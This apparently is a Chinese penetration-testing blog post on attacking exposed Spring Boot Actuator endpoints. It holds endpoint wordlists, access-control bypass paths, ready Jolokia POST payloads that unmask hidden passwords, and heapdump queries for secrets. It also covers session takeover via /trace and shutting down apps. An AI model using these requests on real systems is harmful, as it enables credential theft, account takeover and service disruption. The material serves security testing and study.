@@ -1,0 +1,660 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Spring Bootp平台攻击手法 | Jici&#39;s Blog</title>
+  <meta name="author" content="Jici">
+  
+  <meta name="description" content="Spring Boot 端点Fuzz技巧
+一些开发者会修改Spring根路径/管理端点名称，比如：
+
+/manage
+/management
+/monitor
+项目 App 相关名称">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Spring Bootp平台攻击手法"/>
+  <meta property="og:site_name" content="Jici&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon-16x16.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-70812759-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?cb5448498d7169c668b07c2b255d62c1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<!-- hexo injector head_end start --><script> let HEXO_MMEDIA_DATA = { js: [], css: [], aplayerData: [], metingData: [], artPlayerData: [], dplayerData: []}; </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Jici&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>所有文章
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>关于我
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/record" title="Record all kinds of completed target machines">
+			  <i class=""></i>记录榜
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/plan" title="Record what needs to be done and what is worth doing">
+			  <i class=""></i>计划清单
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/friendlinks" title="my friends">
+			  <i class=""></i>友情链接
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/pictureGallery" title="Record some exquisite pictures">
+			  <i class=""></i>画廊
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@2.7.8/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+	
+		<div class="page-header">
+			<h1> Spring Bootp平台攻击手法</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1>Spring Boot 端点Fuzz技巧</h1>
+<p>一些开发者会修改Spring根路径/管理端点名称，比如：</p>
+<ul>
+<li>/manage</li>
+<li>/management</li>
+<li>/monitor</li>
+<li>项目 App 相关名称</li>
+</ul>
+<p>还有修改端点名称的，比如：</p>
+<ul>
+<li>/env =&gt; /appenv</li>
+<li>/health =&gt; /healthcheck</li>
+</ul>
+<p>一般来讲，<mark>暴露出 Spring boot 应用的相关接口和传参信息</mark>并不能算是漏洞，但是以 “默认安全” 来讲，不暴露出这些信息更加安全。对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解。下面就列举一些相关的路由：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;v2&#x2F;api-docs
+&#x2F;swagger-ui.html
+&#x2F;swagger
+&#x2F;api-docs
+&#x2F;api.html
+&#x2F;swagger-ui
+&#x2F;swagger&#x2F;codes
+&#x2F;api&#x2F;index.html
+&#x2F;api&#x2F;v2&#x2F;api-docs
+&#x2F;v2&#x2F;swagger.json
+&#x2F;swagger-ui&#x2F;html
+&#x2F;distv2&#x2F;index.html
+&#x2F;swagger&#x2F;index.html
+&#x2F;sw&#x2F;swagger-ui.html
+&#x2F;api&#x2F;swagger-ui.html
+&#x2F;static&#x2F;swagger.json
+&#x2F;user&#x2F;swagger-ui.html
+&#x2F;swagger-ui&#x2F;index.html
+&#x2F;swagger-dubbo&#x2F;api-docs
+&#x2F;template&#x2F;swagger-ui.html
+&#x2F;swagger&#x2F;static&#x2F;index.html
+&#x2F;dubbo-provider&#x2F;distv2&#x2F;index.html
+&#x2F;spring-security-rest&#x2F;api&#x2F;swagger-ui.html
+&#x2F;spring-security-oauth-resource&#x2F;swagger-ui.html
+&#x2F;mappings
+&#x2F;metrics
+&#x2F;beans
+&#x2F;configprops
+&#x2F;actuator&#x2F;metrics
+&#x2F;actuator&#x2F;mappings
+&#x2F;actuator&#x2F;beans
+&#x2F;actuator&#x2F;configprops<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>这里做一个约定，路由 = 网络路径 = 端点</p>
+</blockquote>
+<p>除此之外，还有一些Spring Boot的默认路由，如下</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
+&#x2F;auditevents
+&#x2F;autoconfig
+&#x2F;beans
+&#x2F;caches
+&#x2F;conditions
+&#x2F;configprops
+&#x2F;docs
+&#x2F;dump
+&#x2F;env
+&#x2F;flyway
+&#x2F;health
+&#x2F;heapdump
+&#x2F;httptrace
+&#x2F;info
+&#x2F;intergrationgraph
+&#x2F;jolokia
+&#x2F;logfile
+&#x2F;loggers
+&#x2F;liquibase
+&#x2F;metrics
+&#x2F;mappings
+&#x2F;prometheus
+&#x2F;refresh
+&#x2F;scheduledtasks
+&#x2F;sessions
+&#x2F;shutdown
+&#x2F;trace
+&#x2F;threaddump
+&#x2F;actuator&#x2F;auditevents
+&#x2F;actuator&#x2F;beans
+&#x2F;actuator&#x2F;health
+&#x2F;actuator&#x2F;conditions
+&#x2F;actuator&#x2F;configprops
+&#x2F;actuator&#x2F;env
+&#x2F;actuator&#x2F;info
+&#x2F;actuator&#x2F;loggers
+&#x2F;actuator&#x2F;heapdump
+&#x2F;actuator&#x2F;threaddump
+&#x2F;actuator&#x2F;metrics
+&#x2F;actuator&#x2F;scheduledtasks
+&#x2F;actuator&#x2F;httptrace
+&#x2F;actuator&#x2F;mappings
+&#x2F;actuator&#x2F;jolokia
+&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1>Spring Boot 端点敏感信息泄露</h1>
+<p>如果开发者没做端点保护/端点保护不严格，就可能导致端点敏感信息泄露</p>
+<h2 id="概述">概述</h2>
+<p>这里概述一下寻找漏洞比较重要端点：</p>
+<ul>
+<li>
+<p>/env、/actuator/env【GET】：</p>
+<ul>
+<li>请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息</li>
+<li>当开发者的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文</li>
+<li>有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞</li>
+<li>有概率获得星号遮掩的密码、密钥等重要隐私信息的明文</li>
+</ul>
+</li>
+<li>
+<p>/refresh、/actuator/refresh【POST】：请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh接口刷新属性变量来触发相关 RCE 漏洞</p>
+</li>
+<li>
+<p>/restart、/actuator/restart【POST】：暴露出此接口的情况较少，可以配合 POST 请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞</p>
+</li>
+<li>
+<p>/shutdown、/actuator/shutdown【POST】：用来关闭应用程序，这个端点一般不开放，一般也不会去测试，扫描器更加不可能将这个列为扫描端点（万一真的暴露了这个端点，扫到了就直接把业务程序关闭了）。这里讲一个判定技巧：<mark>这个端点只有使用POST请求的时候才会触发关闭，如果存在这个端点，可以先尝试GET请求，出现&quot;Method Not Allowed&quot;的字样则说明是存在的</mark></p>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240409115004629.png" alt="image-20240409115004629"></p>
+<blockquote>
+<p>shutdown端点默认是关闭的。可以在application.properties中配置management.endpoint.shutdown.enabled=true来启用该端点</p>
+</blockquote>
+<p>下面通过视频演示访问shutdown端点，体会关闭应用程序的危险性</p>
+<p><video src="shutdown关闭应用程序.mp4"controls></video></video></p>
+</li>
+<li>
+<p>/jolokia、/actuator/jolokia：可以通过 /jolokia/list接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等</p>
+</li>
+<li>
+<p>/trace、/actuator/httptrace：一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情，以及有效用户或管理员的 session、cookie、jwt token 等信息</p>
+</li>
+</ul>
+<p>下面展开来讲</p>
+<h2 id="env-泄露配置信息">env 泄露配置信息</h2>
+<p>这个端点会泄露系统版本、环境变量、内网地址等信息（甚至可能直接导致数据库密码泄露）</p>
+<pre class="line-numbers language-none"><code class="language-none"># Spring Boot 2.x
+http:&#x2F;&#x2F;127.0.0.1:8100&#x2F;actuator&#x2F;env
+# Spring Boot 1.x
+http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;env<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>但是一些敏感信息会被关键词匹配，做隐藏*处理（即星号脱敏）</p>
+</blockquote>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408210924233.png" alt="image-20240408210924233"></p>
+<p>当遇到访问 /actuator 可以访问，但再<mark>访问如 /env 的时候被拦截</mark>，这个时候可以尝试以下方法：</p>
+<ul>
+<li>
+<p>更换请求方法</p>
+</li>
+<li>
+<p>/actuator;/env;</p>
+</li>
+<li>
+<p>/actuator/; /env</p>
+</li>
+<li>
+<p>Content-Type改为application/json</p>
+</li>
+<li>
+<p>大数据包绕过</p>
+</li>
+</ul>
+<p>下面再讲讲如何绕过星号脱敏</p>
+<h3 id="绕过星号脱敏">绕过星号脱敏</h3>
+<p>方法1：</p>
+<ul>
+<li>
+<p>利用条件</p>
+<ul>
+<li>
+<p>目标网站存在 /jolokia或 /actuator/jolokia接口</p>
+</li>
+<li>
+<p>目标使用了 jolokia-core依赖</p>
+</li>
+</ul>
+</li>
+<li>
+<p>利用方法</p>
+<ol>
+<li>
+<p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名</p>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240410095550816.png" alt="image-20240410095550816"></p>
+</li>
+<li>
+<p>jolokia 调用相关 Mbean 获取明文：</p>
+</li>
+</ol>
+<p>将下面示例中的 security.user.password替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code>键中</p>
+   <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
+POST &#x2F;jolokia
+Content-Type: application&#x2F;json
+
+&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;
+
+# Spring Boot 2.x
+POST &#x2F;actuator&#x2F;jolokia
+Content-Type: application&#x2F;json
+
+&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>调用 org.springframework.bootMbean。实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法。</p>
+</blockquote>
+   <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
+POST &#x2F;jolokia
+Content-Type: application&#x2F;json
+
+&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;
+
+# Spring Boot 2.x
+POST &#x2F;actuator&#x2F;jolokia
+Content-Type: application&#x2F;json
+
+&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name&#x3D;environmentManager,type&#x3D;EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>调用org.springframework.cloud.context.environmentMbean。实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
+</blockquote>
+<p>或者调用其他 Mbean，因为目标具体存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p>
+</li>
+</ul>
+<h2 id="trace-泄露用户请求信息">trace 泄露用户请求信息</h2>
+<p>此端点允许查看 HTTP 请求和响应的跟踪信息，包括请求和响应的头部、参数等。</p>
+<pre class="line-numbers language-none"><code class="language-none"># Spring Boot 2.x
+http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;actuator&#x2F;trace
+# Spring Boot 1.x
+http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;trace
+# 其他
+http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;httptrace
+http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;actuator&#x2F;httptrace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>通过这个我们可以获取到请求这个站点时的完整的http包，其中就可能包括正常用户的session，从而导致我们可以直接接管登录，如果遇到管理员的会话，那么危害就可能进一步扩大。</p>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408211548652.png" alt="image-20240408211548652"></p>
+<h2 id="mappings-泄露路由信息">mappings 泄露路由信息</h2>
+<p>该端点用于描述全部的 URI 路径，以及和控制器的映射关系</p>
+<pre class="line-numbers language-none"><code class="language-none"># Spring Boot 2.x
+http:&#x2F;&#x2F;127.0.0.1:8100&#x2F;actuator&#x2F;mappings
+# Spring Boot 1.x
+http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;mappings<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408213513262.png" alt="image-20240408213513262"></p>
+<h2 id="heapdump-泄露堆栈信息">heapdump 泄露堆栈信息</h2>
+<p>HeapDump文件是JVM虚拟机运行时内存的一个快照，通常用于性能分析等，但是因为其保存了对象、类等相关的信息，如果被泄露也会造成信息泄露。HeapDump文件会通过/heapdump端点暴露出来（可以通过/heapdump端点下载heapdump文件，泄露JAVA堆栈信息）</p>
+<pre class="line-numbers language-none"><code class="language-none"># Spring Boot 2.x
+http:&#x2F;&#x2F;127.0.0.1:8100&#x2F;heapdump
+# Spring Boot 1.x
+http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;actuator&#x2F;heapdump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><mark>其中可以窃取到一些关键的信息，比如一些关键的Key，或者数据库连接密码</mark>，但是大多扫描工具没把它列为扫描端点。</p>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408214811816.png" alt="image-20240408214811816"></p>
+<p>通过这个端点下载HeapDump文件后，我们可以用&quot;Eclipse Memory Analyzer&quot;内存分析工具，来搜索特殊字符，比如password、token等。</p>
+<pre class="line-numbers language-none"><code class="language-none">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
+
+select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408214949651.png" alt="image-20240408214949651"></p>
+<blockquote>
+<p>除了&quot;Eclipse Memory Analyzer&quot;内存分析工具之外，还可以使用一款在安装了JDK6U7及以上版本会自动安装的名为&quot;Java VisualVM&quot;的工具</p>
+</blockquote>
+<p>Java VisualVM的路径在JDK安装目录下的bin文件夹中，程序名为<code>jvisualvm.exe</code>，双击启动即可</p>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408215433813.png" alt="image-20240408215433813"></p>
+<p>之后导入下载到的HeapDump文件，打开QOL控制台</p>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408215600998.png" alt="image-20240408215600998"></p>
+<p>在查询编辑器输入查询语句即可</p>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408215648584.png" alt="image-20240408215648584"></p>
+<p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408215700248.png" alt="image-20240408215700248"></p>
+<h1>鸣谢</h1>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9763?time__1311=n4%2BxuDgD9AD%3DDtIYGNDQT4BK4iIKfSoqoSrD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7">Spring Boot Actuator 未授权的测试与利用思路 - 先知社区 (aliyun.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/271347.html">Spring Boot漏洞exploit利用方法渗透技巧汇总 - FreeBuf网络安全行业门户</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_9652359/5508872">Spring Actuator信息泄露HeapDump_土豆笔记的技术博客_51CTO博客</a></li>
+<li><a target="_blank" rel="noopener" href="https://apifox.com/apiskills/how-to-use-spring-boot-actuator-endpoints/">Spring Boot Actuator Endpoints 如何使用？Spring Boot 运行状况端点的用法 (apifox.com)</a></li>
+<li></li>
+</ul>
+	  
+	</div>
+
+	<div>
+  	<center>
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/04/10/Java常识/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/04/07/Spring-Boot基础/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+
+	</div> <!-- col-md-9/col-md-12 -->
+		
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-04-08 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/渗透测试/">渗透测试<span>23</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+	</div>
+		
+
+</div><!-- row -->
+
+
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  &copy; 2024 Jici
+  
+      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>    
+</p>
+
+  <script src='https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+
+
+<span class="post-meta-divider">|</span>
+本站总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;次</span>
+
+<script>
+var bszCaller,bszTag;!function(){var c,d,e,a=!1,b=[];ready=function(c){return a||"interactive"===document.readyState||"complete"===document.readyState?c.call(document):b.push(function(){return c.call(this)}),this},d=function(){for(var a=0,c=b.length;c>a;a++)b[a].apply(document);b=[]},e=function(){a||(a=!0,d.call(window),document.removeEventListener?document.removeEventListener("DOMContentLoaded",e,!1):document.attachEvent&&(document.detachEvent("onreadystatechange",e),window==window.top&&(clearInterval(c),c=null)))},document.addEventListener?document.addEventListener("DOMContentLoaded",e,!1):document.attachEvent&&(document.attachEvent("onreadystatechange",function(){/loaded|complete/.test(document.readyState)&&e()}),window==window.top&&(c=setInterval(function(){try{a||document.documentElement.doScroll("left")}catch(b){return}e()},5)))}(),bszCaller={fetch:function(a,b){var c="BusuanziCallback_"+Math.floor(1099511627776*Math.random());window[c]=this.evalCall(b),a=a.replace("=BusuanziCallback","="+c),scriptTag=document.createElement("SCRIPT"),scriptTag.type="text/javascript",scriptTag.defer=!0,scriptTag.src=a,scriptTag.referrerPolicy="no-referrer-when-downgrade",document.getElementsByTagName("HEAD")[0].appendChild(scriptTag)},evalCall:function(a){return function(b){ready(function(){try{a(b),scriptTag.parentElement.removeChild(scriptTag)}catch(c){bszTag.hides()}})}}},bszCaller.fetch("//busuanzi.ibruce.info/busuanzi?jsonpCallback=BusuanziCallback",function(a){bszTag.texts(a),bszTag.shows()}),bszTag={bszs:["site_pv","page_pv","site_uv"],texts:function(a){this.bszs.map(function(b){var c=document.getElementById("busuanzi_value_"+b);c&&(c.innerHTML=a[b])})},hides:function(){this.bszs.map(function(a){var b=document.getElementById("busuanzi_container_"+a);b&&(b.style.display="none")})},shows:function(){this.bszs.map(function(a){var b=document.getElementById("busuanzi_container_"+a);b&&(b.style.display="inline")})}};
+</script>
+
+
+<!-- <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("08/12/2023 00:00:00");//在此处修改你的建站时间
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已勉强运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+    setInterval("createtime()",250);
+</script>
+<br><br>
+<span class="num">及辞已经在本站记录了 126.8k 字</span>
+<script>
+  document.addEventListener("DOMContentLoaded", function() {
+    fetch('/imageCount.json')
+      .then(response => response.json())
+      .then(data => {
+        const imageCount = data.count;
+        const imageCountElement = document.getElementById('imageCount');
+        imageCountElement.textContent = `共计收录了 ${imageCount} 张图片`;
+      })
+      .catch(error => {
+        console.error('Failed to load image count:', error);
+      });
+  });
+</script>
+<br><br>
+<span id="imageCount">正在加载图片数目...</span>
+</div> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!-- hexo injector body_end start --><script src="/assets/mmedia/mmedia-loader.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/ni-j.model.json"},"display":{"position":"left","width":260,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+   </html>
+
+<!-- 雪花特效 -->
+<!-- 直接引用公网CDN在线文件 -->
+<!-- <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/xuehuapiaoluo.js">-->
+<!-- 引用本地文件 -->
+<!--<script type="text/javascript" src="\js\snow.js"></script>-->
+
+<!-- 樱花花特效 -->
+<!-- 直接引用公网CDN在线文件 -->
+<!--<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>-->
+<!-- 引用本地文件 -->
